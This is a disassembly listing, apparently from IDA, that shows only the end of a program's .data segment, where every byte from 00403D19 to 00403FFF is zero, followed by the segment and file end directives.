.data:00403D19                 db    0
.data:00403D1A                 db    0
.data:00403D1B                 db    0
.data:00403D1C                 db    0
.data:00403D1D                 db    0
.data:00403D1E                 db    0
.data:00403D1F                 db    0
.data:00403D20                 db    0
.data:00403D21                 db    0
.data:00403D22                 db    0
.data:00403D23                 db    0
.data:00403D24                 db    0
.data:00403D25                 db    0
.data:00403D26                 db    0
.data:00403D27                 db    0
.data:00403D28                 db    0
.data:00403D29                 db    0
.data:00403D2A                 db    0
.data:00403D2B                 db    0
.data:00403D2C                 db    0
.data:00403D2D                 db    0
.data:00403D2E                 db    0
.data:00403D2F                 db    0
.data:00403D30                 db    0
.data:00403D31                 db    0
.data:00403D32                 db    0
.data:00403D33                 db    0
.data:00403D34                 db    0
.data:00403D35                 db    0
.data:00403D36                 db    0
.data:00403D37                 db    0
.data:00403D38                 db    0
.data:00403D39                 db    0
.data:00403D3A                 db    0
.data:00403D3B                 db    0
.data:00403D3C                 db    0
.data:00403D3D                 db    0
.data:00403D3E                 db    0
.data:00403D3F                 db    0
.data:00403D40                 db    0
.data:00403D41                 db    0
.data:00403D42                 db    0
.data:00403D43                 db    0
.data:00403D44                 db    0
.data:00403D45                 db    0
.data:00403D46                 db    0
.data:00403D47                 db    0
.data:00403D48                 db    0
.data:00403D49                 db    0
.data:00403D4A                 db    0
.data:00403D4B                 db    0
.data:00403D4C                 db    0
.data:00403D4D                 db    0
.data:00403D4E                 db    0
.data:00403D4F                 db    0
.data:00403D50                 db    0
.data:00403D51                 db    0
.data:00403D52                 db    0
.data:00403D53                 db    0
.data:00403D54                 db    0
.data:00403D55                 db    0
.data:00403D56                 db    0
.data:00403D57                 db    0
.data:00403D58                 db    0
.data:00403D59                 db    0
.data:00403D5A                 db    0
.data:00403D5B                 db    0
.data:00403D5C                 db    0
.data:00403D5D                 db    0
.data:00403D5E                 db    0
.data:00403D5F                 db    0
.data:00403D60                 db    0
.data:00403D61                 db    0
.data:00403D62                 db    0
.data:00403D63                 db    0
.data:00403D64                 db    0
.data:00403D65                 db    0
.data:00403D66                 db    0
.data:00403D67                 db    0
.data:00403D68                 db    0
.data:00403D69                 db    0
.data:00403D6A                 db    0
.data:00403D6B                 db    0
.data:00403D6C                 db    0
.data:00403D6D                 db    0
.data:00403D6E                 db    0
.data:00403D6F                 db    0
.data:00403D70                 db    0
.data:00403D71                 db    0
.data:00403D72                 db    0
.data:00403D73                 db    0
.data:00403D74                 db    0
.data:00403D75                 db    0
.data:00403D76                 db    0
.data:00403D77                 db    0
.data:00403D78                 db    0
.data:00403D79                 db    0
.data:00403D7A                 db    0
.data:00403D7B                 db    0
.data:00403D7C                 db    0
.data:00403D7D                 db    0
.data:00403D7E                 db    0
.data:00403D7F                 db    0
.data:00403D80                 db    0
.data:00403D81                 db    0
.data:00403D82                 db    0
.data:00403D83                 db    0
.data:00403D84                 db    0
.data:00403D85                 db    0
.data:00403D86                 db    0
.data:00403D87                 db    0
.data:00403D88                 db    0
.data:00403D89                 db    0
.data:00403D8A                 db    0
.data:00403D8B                 db    0
.data:00403D8C                 db    0
.data:00403D8D                 db    0
.data:00403D8E                 db    0
.data:00403D8F                 db    0
.data:00403D90                 db    0
.data:00403D91                 db    0
.data:00403D92                 db    0
.data:00403D93                 db    0
.data:00403D94                 db    0
.data:00403D95                 db    0
.data:00403D96                 db    0
.data:00403D97                 db    0
.data:00403D98                 db    0
.data:00403D99                 db    0
.data:00403D9A                 db    0
.data:00403D9B                 db    0
.data:00403D9C                 db    0
.data:00403D9D                 db    0
.data:00403D9E                 db    0
.data:00403D9F                 db    0
.data:00403DA0                 db    0
.data:00403DA1                 db    0
.data:00403DA2                 db    0
.data:00403DA3                 db    0
.data:00403DA4                 db    0
.data:00403DA5                 db    0
.data:00403DA6                 db    0
.data:00403DA7                 db    0
.data:00403DA8                 db    0
.data:00403DA9                 db    0
.data:00403DAA                 db    0
.data:00403DAB                 db    0
.data:00403DAC                 db    0
.data:00403DAD                 db    0
.data:00403DAE                 db    0
.data:00403DAF                 db    0
.data:00403DB0                 db    0
.data:00403DB1                 db    0
.data:00403DB2                 db    0
.data:00403DB3                 db    0
.data:00403DB4                 db    0
.data:00403DB5                 db    0
.data:00403DB6                 db    0
.data:00403DB7                 db    0
.data:00403DB8                 db    0
.data:00403DB9                 db    0
.data:00403DBA                 db    0
.data:00403DBB                 db    0
.data:00403DBC                 db    0
.data:00403DBD                 db    0
.data:00403DBE                 db    0
.data:00403DBF                 db    0
.data:00403DC0                 db    0
.data:00403DC1                 db    0
.data:00403DC2                 db    0
.data:00403DC3                 db    0
.data:00403DC4                 db    0
.data:00403DC5                 db    0
.data:00403DC6                 db    0
.data:00403DC7                 db    0
.data:00403DC8                 db    0
.data:00403DC9                 db    0
.data:00403DCA                 db    0
.data:00403DCB                 db    0
.data:00403DCC                 db    0
.data:00403DCD                 db    0
.data:00403DCE                 db    0
.data:00403DCF                 db    0
.data:00403DD0                 db    0
.data:00403DD1                 db    0
.data:00403DD2                 db    0
.data:00403DD3                 db    0
.data:00403DD4                 db    0
.data:00403DD5                 db    0
.data:00403DD6                 db    0
.data:00403DD7                 db    0
.data:00403DD8                 db    0
.data:00403DD9                 db    0
.data:00403DDA                 db    0
.data:00403DDB                 db    0
.data:00403DDC                 db    0
.data:00403DDD                 db    0
.data:00403DDE                 db    0
.data:00403DDF                 db    0
.data:00403DE0                 db    0
.data:00403DE1                 db    0
.data:00403DE2                 db    0
.data:00403DE3                 db    0
.data:00403DE4                 db    0
.data:00403DE5                 db    0
.data:00403DE6                 db    0
.data:00403DE7                 db    0
.data:00403DE8                 db    0
.data:00403DE9                 db    0
.data:00403DEA                 db    0
.data:00403DEB                 db    0
.data:00403DEC                 db    0
.data:00403DED                 db    0
.data:00403DEE                 db    0
.data:00403DEF                 db    0
.data:00403DF0                 db    0
.data:00403DF1                 db    0
.data:00403DF2                 db    0
.data:00403DF3                 db    0
.data:00403DF4                 db    0
.data:00403DF5                 db    0
.data:00403DF6                 db    0
.data:00403DF7                 db    0
.data:00403DF8                 db    0
.data:00403DF9                 db    0
.data:00403DFA                 db    0
.data:00403DFB                 db    0
.data:00403DFC                 db    0
.data:00403DFD                 db    0
.data:00403DFE                 db    0
.data:00403DFF                 db    0
.data:00403E00                 db    0
.data:00403E01                 db    0
.data:00403E02                 db    0
.data:00403E03                 db    0
.data:00403E04                 db    0
.data:00403E05                 db    0
.data:00403E06                 db    0
.data:00403E07                 db    0
.data:00403E08                 db    0
.data:00403E09                 db    0
.data:00403E0A                 db    0
.data:00403E0B                 db    0
.data:00403E0C                 db    0
.data:00403E0D                 db    0
.data:00403E0E                 db    0
.data:00403E0F                 db    0
.data:00403E10                 db    0
.data:00403E11                 db    0
.data:00403E12                 db    0
.data:00403E13                 db    0
.data:00403E14                 db    0
.data:00403E15                 db    0
.data:00403E16                 db    0
.data:00403E17                 db    0
.data:00403E18                 db    0
.data:00403E19                 db    0
.data:00403E1A                 db    0
.data:00403E1B                 db    0
.data:00403E1C                 db    0
.data:00403E1D                 db    0
.data:00403E1E                 db    0
.data:00403E1F                 db    0
.data:00403E20                 db    0
.data:00403E21                 db    0
.data:00403E22                 db    0
.data:00403E23                 db    0
.data:00403E24                 db    0
.data:00403E25                 db    0
.data:00403E26                 db    0
.data:00403E27                 db    0
.data:00403E28                 db    0
.data:00403E29                 db    0
.data:00403E2A                 db    0
.data:00403E2B                 db    0
.data:00403E2C                 db    0
.data:00403E2D                 db    0
.data:00403E2E                 db    0
.data:00403E2F                 db    0
.data:00403E30                 db    0
.data:00403E31                 db    0
.data:00403E32                 db    0
.data:00403E33                 db    0
.data:00403E34                 db    0
.data:00403E35                 db    0
.data:00403E36                 db    0
.data:00403E37                 db    0
.data:00403E38                 db    0
.data:00403E39                 db    0
.data:00403E3A                 db    0
.data:00403E3B                 db    0
.data:00403E3C                 db    0
.data:00403E3D                 db    0
.data:00403E3E                 db    0
.data:00403E3F                 db    0
.data:00403E40                 db    0
.data:00403E41                 db    0
.data:00403E42                 db    0
.data:00403E43                 db    0
.data:00403E44                 db    0
.data:00403E45                 db    0
.data:00403E46                 db    0
.data:00403E47                 db    0
.data:00403E48                 db    0
.data:00403E49                 db    0
.data:00403E4A                 db    0
.data:00403E4B                 db    0
.data:00403E4C                 db    0
.data:00403E4D                 db    0
.data:00403E4E                 db    0
.data:00403E4F                 db    0
.data:00403E50                 db    0
.data:00403E51                 db    0
.data:00403E52                 db    0
.data:00403E53                 db    0
.data:00403E54                 db    0
.data:00403E55                 db    0
.data:00403E56                 db    0
.data:00403E57                 db    0
.data:00403E58                 db    0
.data:00403E59                 db    0
.data:00403E5A                 db    0
.data:00403E5B                 db    0
.data:00403E5C                 db    0
.data:00403E5D                 db    0
.data:00403E5E                 db    0
.data:00403E5F                 db    0
.data:00403E60                 db    0
.data:00403E61                 db    0
.data:00403E62                 db    0
.data:00403E63                 db    0
.data:00403E64                 db    0
.data:00403E65                 db    0
.data:00403E66                 db    0
.data:00403E67                 db    0
.data:00403E68                 db    0
.data:00403E69                 db    0
.data:00403E6A                 db    0
.data:00403E6B                 db    0
.data:00403E6C                 db    0
.data:00403E6D                 db    0
.data:00403E6E                 db    0
.data:00403E6F                 db    0
.data:00403E70                 db    0
.data:00403E71                 db    0
.data:00403E72                 db    0
.data:00403E73                 db    0
.data:00403E74                 db    0
.data:00403E75                 db    0
.data:00403E76                 db    0
.data:00403E77                 db    0
.data:00403E78                 db    0
.data:00403E79                 db    0
.data:00403E7A                 db    0
.data:00403E7B                 db    0
.data:00403E7C                 db    0
.data:00403E7D                 db    0
.data:00403E7E                 db    0
.data:00403E7F                 db    0
.data:00403E80                 db    0
.data:00403E81                 db    0
.data:00403E82                 db    0
.data:00403E83                 db    0
.data:00403E84                 db    0
.data:00403E85                 db    0
.data:00403E86                 db    0
.data:00403E87                 db    0
.data:00403E88                 db    0
.data:00403E89                 db    0
.data:00403E8A                 db    0
.data:00403E8B                 db    0
.data:00403E8C                 db    0
.data:00403E8D                 db    0
.data:00403E8E                 db    0
.data:00403E8F                 db    0
.data:00403E90                 db    0
.data:00403E91                 db    0
.data:00403E92                 db    0
.data:00403E93                 db    0
.data:00403E94                 db    0
.data:00403E95                 db    0
.data:00403E96                 db    0
.data:00403E97                 db    0
.data:00403E98                 db    0
.data:00403E99                 db    0
.data:00403E9A                 db    0
.data:00403E9B                 db    0
.data:00403E9C                 db    0
.data:00403E9D                 db    0
.data:00403E9E                 db    0
.data:00403E9F                 db    0
.data:00403EA0                 db    0
.data:00403EA1                 db    0
.data:00403EA2                 db    0
.data:00403EA3                 db    0
.data:00403EA4                 db    0
.data:00403EA5                 db    0
.data:00403EA6                 db    0
.data:00403EA7                 db    0
.data:00403EA8                 db    0
.data:00403EA9                 db    0
.data:00403EAA                 db    0
.data:00403EAB                 db    0
.data:00403EAC                 db    0
.data:00403EAD                 db    0
.data:00403EAE                 db    0
.data:00403EAF                 db    0
.data:00403EB0                 db    0
.data:00403EB1                 db    0
.data:00403EB2                 db    0
.data:00403EB3                 db    0
.data:00403EB4                 db    0
.data:00403EB5                 db    0
.data:00403EB6                 db    0
.data:00403EB7                 db    0
.data:00403EB8                 db    0
.data:00403EB9                 db    0
.data:00403EBA                 db    0
.data:00403EBB                 db    0
.data:00403EBC                 db    0
.data:00403EBD                 db    0
.data:00403EBE                 db    0
.data:00403EBF                 db    0
.data:00403EC0                 db    0
.data:00403EC1                 db    0
.data:00403EC2                 db    0
.data:00403EC3                 db    0
.data:00403EC4                 db    0
.data:00403EC5                 db    0
.data:00403EC6                 db    0
.data:00403EC7                 db    0
.data:00403EC8                 db    0
.data:00403EC9                 db    0
.data:00403ECA                 db    0
.data:00403ECB                 db    0
.data:00403ECC                 db    0
.data:00403ECD                 db    0
.data:00403ECE                 db    0
.data:00403ECF                 db    0
.data:00403ED0                 db    0
.data:00403ED1                 db    0
.data:00403ED2                 db    0
.data:00403ED3                 db    0
.data:00403ED4                 db    0
.data:00403ED5                 db    0
.data:00403ED6                 db    0
.data:00403ED7                 db    0
.data:00403ED8                 db    0
.data:00403ED9                 db    0
.data:00403EDA                 db    0
.data:00403EDB                 db    0
.data:00403EDC                 db    0
.data:00403EDD                 db    0
.data:00403EDE                 db    0
.data:00403EDF                 db    0
.data:00403EE0                 db    0
.data:00403EE1                 db    0
.data:00403EE2                 db    0
.data:00403EE3                 db    0
.data:00403EE4                 db    0
.data:00403EE5                 db    0
.data:00403EE6                 db    0
.data:00403EE7                 db    0
.data:00403EE8                 db    0
.data:00403EE9                 db    0
.data:00403EEA                 db    0
.data:00403EEB                 db    0
.data:00403EEC                 db    0
.data:00403EED                 db    0
.data:00403EEE                 db    0
.data:00403EEF                 db    0
.data:00403EF0                 db    0
.data:00403EF1                 db    0
.data:00403EF2                 db    0
.data:00403EF3                 db    0
.data:00403EF4                 db    0
.data:00403EF5                 db    0
.data:00403EF6                 db    0
.data:00403EF7                 db    0
.data:00403EF8                 db    0
.data:00403EF9                 db    0
.data:00403EFA                 db    0
.data:00403EFB                 db    0
.data:00403EFC                 db    0
.data:00403EFD                 db    0
.data:00403EFE                 db    0
.data:00403EFF                 db    0
.data:00403F00                 db    0
.data:00403F01                 db    0
.data:00403F02                 db    0
.data:00403F03                 db    0
.data:00403F04                 db    0
.data:00403F05                 db    0
.data:00403F06                 db    0
.data:00403F07                 db    0
.data:00403F08                 db    0
.data:00403F09                 db    0
.data:00403F0A                 db    0
.data:00403F0B                 db    0
.data:00403F0C                 db    0
.data:00403F0D                 db    0
.data:00403F0E                 db    0
.data:00403F0F                 db    0
.data:00403F10                 db    0
.data:00403F11                 db    0
.data:00403F12                 db    0
.data:00403F13                 db    0
.data:00403F14                 db    0
.data:00403F15                 db    0
.data:00403F16                 db    0
.data:00403F17                 db    0
.data:00403F18                 db    0
.data:00403F19                 db    0
.data:00403F1A                 db    0
.data:00403F1B                 db    0
.data:00403F1C                 db    0
.data:00403F1D                 db    0
.data:00403F1E                 db    0
.data:00403F1F                 db    0
.data:00403F20                 db    0
.data:00403F21                 db    0
.data:00403F22                 db    0
.data:00403F23                 db    0
.data:00403F24                 db    0
.data:00403F25                 db    0
.data:00403F26                 db    0
.data:00403F27                 db    0
.data:00403F28                 db    0
.data:00403F29                 db    0
.data:00403F2A                 db    0
.data:00403F2B                 db    0
.data:00403F2C                 db    0
.data:00403F2D                 db    0
.data:00403F2E                 db    0
.data:00403F2F                 db    0
.data:00403F30                 db    0
.data:00403F31                 db    0
.data:00403F32                 db    0
.data:00403F33                 db    0
.data:00403F34                 db    0
.data:00403F35                 db    0
.data:00403F36                 db    0
.data:00403F37                 db    0
.data:00403F38                 db    0
.data:00403F39                 db    0
.data:00403F3A                 db    0
.data:00403F3B                 db    0
.data:00403F3C                 db    0
.data:00403F3D                 db    0
.data:00403F3E                 db    0
.data:00403F3F                 db    0
.data:00403F40                 db    0
.data:00403F41                 db    0
.data:00403F42                 db    0
.data:00403F43                 db    0
.data:00403F44                 db    0
.data:00403F45                 db    0
.data:00403F46                 db    0
.data:00403F47                 db    0
.data:00403F48                 db    0
.data:00403F49                 db    0
.data:00403F4A                 db    0
.data:00403F4B                 db    0
.data:00403F4C                 db    0
.data:00403F4D                 db    0
.data:00403F4E                 db    0
.data:00403F4F                 db    0
.data:00403F50                 db    0
.data:00403F51                 db    0
.data:00403F52                 db    0
.data:00403F53                 db    0
.data:00403F54                 db    0
.data:00403F55                 db    0
.data:00403F56                 db    0
.data:00403F57                 db    0
.data:00403F58                 db    0
.data:00403F59                 db    0
.data:00403F5A                 db    0
.data:00403F5B                 db    0
.data:00403F5C                 db    0
.data:00403F5D                 db    0
.data:00403F5E                 db    0
.data:00403F5F                 db    0
.data:00403F60                 db    0
.data:00403F61                 db    0
.data:00403F62                 db    0
.data:00403F63                 db    0
.data:00403F64                 db    0
.data:00403F65                 db    0
.data:00403F66                 db    0
.data:00403F67                 db    0
.data:00403F68                 db    0
.data:00403F69                 db    0
.data:00403F6A                 db    0
.data:00403F6B                 db    0
.data:00403F6C                 db    0
.data:00403F6D                 db    0
.data:00403F6E                 db    0
.data:00403F6F                 db    0
.data:00403F70                 db    0
.data:00403F71                 db    0
.data:00403F72                 db    0
.data:00403F73                 db    0
.data:00403F74                 db    0
.data:00403F75                 db    0
.data:00403F76                 db    0
.data:00403F77                 db    0
.data:00403F78                 db    0
.data:00403F79                 db    0
.data:00403F7A                 db    0
.data:00403F7B                 db    0
.data:00403F7C                 db    0
.data:00403F7D                 db    0
.data:00403F7E                 db    0
.data:00403F7F                 db    0
.data:00403F80                 db    0
.data:00403F81                 db    0
.data:00403F82                 db    0
.data:00403F83                 db    0
.data:00403F84                 db    0
.data:00403F85                 db    0
.data:00403F86                 db    0
.data:00403F87                 db    0
.data:00403F88                 db    0
.data:00403F89                 db    0
.data:00403F8A                 db    0
.data:00403F8B                 db    0
.data:00403F8C                 db    0
.data:00403F8D                 db    0
.data:00403F8E                 db    0
.data:00403F8F                 db    0
.data:00403F90                 db    0
.data:00403F91                 db    0
.data:00403F92                 db    0
.data:00403F93                 db    0
.data:00403F94                 db    0
.data:00403F95                 db    0
.data:00403F96                 db    0
.data:00403F97                 db    0
.data:00403F98                 db    0
.data:00403F99                 db    0
.data:00403F9A                 db    0
.data:00403F9B                 db    0
.data:00403F9C                 db    0
.data:00403F9D                 db    0
.data:00403F9E                 db    0
.data:00403F9F                 db    0
.data:00403FA0                 db    0
.data:00403FA1                 db    0
.data:00403FA2                 db    0
.data:00403FA3                 db    0
.data:00403FA4                 db    0
.data:00403FA5                 db    0
.data:00403FA6                 db    0
.data:00403FA7                 db    0
.data:00403FA8                 db    0
.data:00403FA9                 db    0
.data:00403FAA                 db    0
.data:00403FAB                 db    0
.data:00403FAC                 db    0
.data:00403FAD                 db    0
.data:00403FAE                 db    0
.data:00403FAF                 db    0
.data:00403FB0                 db    0
.data:00403FB1                 db    0
.data:00403FB2                 db    0
.data:00403FB3                 db    0
.data:00403FB4                 db    0
.data:00403FB5                 db    0
.data:00403FB6                 db    0
.data:00403FB7                 db    0
.data:00403FB8                 db    0
.data:00403FB9                 db    0
.data:00403FBA                 db    0
.data:00403FBB                 db    0
.data:00403FBC                 db    0
.data:00403FBD                 db    0
.data:00403FBE                 db    0
.data:00403FBF                 db    0
.data:00403FC0                 db    0
.data:00403FC1                 db    0
.data:00403FC2                 db    0
.data:00403FC3                 db    0
.data:00403FC4                 db    0
.data:00403FC5                 db    0
.data:00403FC6                 db    0
.data:00403FC7                 db    0
.data:00403FC8                 db    0
.data:00403FC9                 db    0
.data:00403FCA                 db    0
.data:00403FCB                 db    0
.data:00403FCC                 db    0
.data:00403FCD                 db    0
.data:00403FCE                 db    0
.data:00403FCF                 db    0
.data:00403FD0                 db    0
.data:00403FD1                 db    0
.data:00403FD2                 db    0
.data:00403FD3                 db    0
.data:00403FD4                 db    0
.data:00403FD5                 db    0
.data:00403FD6                 db    0
.data:00403FD7                 db    0
.data:00403FD8                 db    0
.data:00403FD9                 db    0
.data:00403FDA                 db    0
.data:00403FDB                 db    0
.data:00403FDC                 db    0
.data:00403FDD                 db    0
.data:00403FDE                 db    0
.data:00403FDF                 db    0
.data:00403FE0                 db    0
.data:00403FE1                 db    0
.data:00403FE2                 db    0
.data:00403FE3                 db    0
.data:00403FE4                 db    0
.data:00403FE5                 db    0
.data:00403FE6                 db    0
.data:00403FE7                 db    0
.data:00403FE8                 db    0
.data:00403FE9                 db    0
.data:00403FEA                 db    0
.data:00403FEB                 db    0
.data:00403FEC                 db    0
.data:00403FED                 db    0
.data:00403FEE                 db    0
.data:00403FEF                 db    0
.data:00403FF0                 db    0
.data:00403FF1                 db    0
.data:00403FF2                 db    0
.data:00403FF3                 db    0
.data:00403FF4                 db    0
.data:00403FF5                 db    0
.data:00403FF6                 db    0
.data:00403FF7                 db    0
.data:00403FF8                 db    0
.data:00403FF9                 db    0
.data:00403FFA                 db    0
.data:00403FFB                 db    0
.data:00403FFC                 db    0
.data:00403FFD                 db    0
.data:00403FFE                 db    0
.data:00403FFF                 db    0
.data:00403FFF _data           ends
.data:00403FFF
.data:00403FFF
.data:00403FFF                 end start